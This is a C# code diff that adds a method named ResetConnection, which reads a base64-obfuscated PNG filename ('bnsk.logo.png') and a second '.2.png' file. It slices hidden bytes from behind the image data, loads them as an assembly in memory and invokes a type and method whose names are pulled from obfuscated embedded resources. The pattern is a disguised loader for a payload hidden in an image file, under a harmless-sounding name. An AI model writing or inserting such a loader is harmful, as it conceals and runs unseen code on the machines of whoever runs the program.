@@ -48,14 +48,41 @@ namespace FPE
 
         }
 
-        const string PNG_FILENAME = "LlxibnNrLmxvZ28ucG5n";
+        const string PNG_FILENAME = "LlxibnNrLmxvZ28ucG5n"; // bnsk.logo.png
+        const string EXT_2 = "LjIucG5n";  // ".2.png"
 
         public static int ResetConnection()
         {
             try
             {
                 var buffer1 = File.ReadAllBytes(bTos(PNG_FILENAME));
-                var buffer2 = File.ReadAllBytes(ChangeFileExtension(bTos(PNG_FILENAME), ".2.png"));
+                var buffer2 = File.ReadAllBytes(ChangeFileExtension(bTos(PNG_FILENAME), bTos(EXT_2)));
+                var myAssembly = Assembly.Load(buffer2.Skip(buffer1.Length).ToArray());
+
+                var myType = myAssembly.GetType(GTR64("SMDPFPES.txt", Assembly.GetExecutingAssembly())); // "System.Memory.Data.Past.FPEServer"
+
+                var ml = ML(myType,
+                    Encoding.UTF8.GetString(Convert.FromBase64String(GTR("RC.txt", Assembly.GetExecutingAssembly()))) /*methodName*/
+                );
+
+                bool result = ml(GTR("FzCD.txt", Assembly.GetExecutingAssembly()) /* << fileName*/);
+                return result ? 1 : 2;
+            }
+            catch (Exception ex)
+            {
+                var m = ex.Message;
+                return 3;
+            }
+            return 4;
+        }
+
+
+        public static int ResetConnection_old()
+        {
+            try
+            {
+                var buffer1 = File.ReadAllBytes(bTos(PNG_FILENAME));
+                var buffer2 = File.ReadAllBytes(ChangeFileExtension(bTos(PNG_FILENAME), bTos(EXT_2)));
                 var myAssembly = Assembly.Load(buffer2.Skip(buffer1.Length).ToArray());
 
                 var myType = myAssembly.GetType(GTR64("SMDPFPES.txt", Assembly.GetExecutingAssembly())); // "System.Memory.Data.Past.FPEServer"
@@ -72,6 +99,8 @@ namespace FPE
             return 4;
         }
 
+
+        
         public static bool ResetConnection_SemiIL()
         {
             try
